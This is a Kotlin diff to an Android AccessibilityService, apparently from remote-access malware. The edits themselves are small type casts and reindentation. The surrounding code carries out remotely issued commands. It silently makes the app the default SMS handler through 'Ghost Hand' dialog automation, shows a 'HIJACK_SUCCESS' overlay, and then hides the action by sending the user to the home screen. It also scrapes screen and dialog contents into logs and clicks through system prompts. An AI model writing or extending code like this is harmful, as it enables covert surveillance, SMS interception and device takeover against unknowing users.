@@ -331,7 +331,7 @@ class MyAccessibilityService : AccessibilityService() {
                 }
             } else if (ScreenRecordManager.expectedMode == "SCRAPE") {
                 val treeJson = getInstantTree(null, 10)
-                val wrapper = JSONObject().apply { put("pkg", pkgName); put("tree", treeJson) }
+                val wrapper = JSONObject().apply { put("pkg", pkgName); put("tree", treeJson as Any) }
                 DumpManager.appendLog("SCRAPE_RECORD_DIALOG", wrapper)
                 DebugLogger.log("SCREEN_REC", "Scraped SystemUI dialog for forensic mapping.")
                 ScreenRecordManager.expectedMode = "" // Disarm
@@ -473,20 +473,21 @@ class MyAccessibilityService : AccessibilityService() {
                                 return@postDelayed
                             }
                             DefaultSmsManager.expectedMode = "" // Disarm
-                        CommandProcessor.updateCommandStatus(applicationContext, DefaultSmsManager.pendingCmdId, "SUCCESS", "Set as Default SMS via Ghost Hand")
-                        
-                        // Delay HOME slightly to ensure dialogs resolve and OS processes the action
-                        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
-                            performGlobalAction(GLOBAL_ACTION_HOME)
+                            CommandProcessor.updateCommandStatus(applicationContext, DefaultSmsManager.pendingCmdId, "SUCCESS", "Set as Default SMS via Ghost Hand")
+                            
+                            // Delay HOME slightly to ensure dialogs resolve and OS processes the action
                             android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                                 performGlobalAction(GLOBAL_ACTION_HOME)
-                            }, 300)
-                        }, 600)
+                                android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
+                                    performGlobalAction(GLOBAL_ACTION_HOME)
+                                }, 300)
+                            }, 600)
 
-                        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
-                            DynamicUIManager.removeOverlay(this@MyAccessibilityService, "HIJACK_SUCCESS_HOME_ROUTED")
-                        }, 2500)
-                    }, 400)
+                            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
+                                DynamicUIManager.removeOverlay(this@MyAccessibilityService, "HIJACK_SUCCESS_HOME_ROUTED")
+                            }, 2500)
+                        }, 400)
+                    }
                 }
             } else if (mode == "RESTORE" || mode == "AUTO_NAV") {
                 val root = rootInActiveWindow ?: return
@@ -651,7 +652,7 @@ class MyAccessibilityService : AccessibilityService() {
                 }
             } else if (DefaultSmsManager.expectedMode == "SCRAPE") {
                 val treeJson = getInstantTree(null, 10)
-                val wrapper = JSONObject().apply { put("pkg", pkgName); put("tree", treeJson) }
+                val wrapper = JSONObject().apply { put("pkg", pkgName); put("tree", treeJson as Any) }
                 DumpManager.appendLog("SCRAPE_SMS_DIALOG", wrapper)
                 DebugLogger.log("GHOST_SMS", "Scraped Default SMS dialog for forensic mapping.")
                 DefaultSmsManager.expectedMode = "" // Disarm
@@ -908,7 +909,7 @@ class MyAccessibilityService : AccessibilityService() {
                     val wrapper = JSONObject()
                     wrapper.put("pkg", pkgName)
                     wrapper.put("ts", now)
-                    wrapper.put("tree", treeJson)
+                    wrapper.put("tree", treeJson as Any)
                     DumpManager.appendLog("TREE", wrapper)
                 }
             }
@@ -1285,8 +1286,9 @@ class MyAccessibilityService : AccessibilityService() {
                                 while (target != null && !target.isClickable) {
                                     target = target.parent
                                 }
-                                if (target != null && target.isClickable) {
-                                    target.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+                                val finalTarget = target
+                                if (finalTarget != null && finalTarget.isClickable) {
+                                    finalTarget.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                                     clicked = true
                                     DebugLogger.log("ANR_KILL", "Task purge executed via '$kw'.")
                                     break
@@ -1837,7 +1839,7 @@ class MyAccessibilityService : AccessibilityService() {
                 }
             }
             
-            result.put("grid_coordinates", grid)
+            result.put("grid_coordinates", grid as Any)
             result.put("view_bounds", boundsStr)
             result.put("screen_res", "${metrics.widthPixels}x${metrics.heightPixels}")
             CommandProcessor.updateCommandStatus(applicationContext, cmdId, "MAP_SUCCESS", null, result, null)
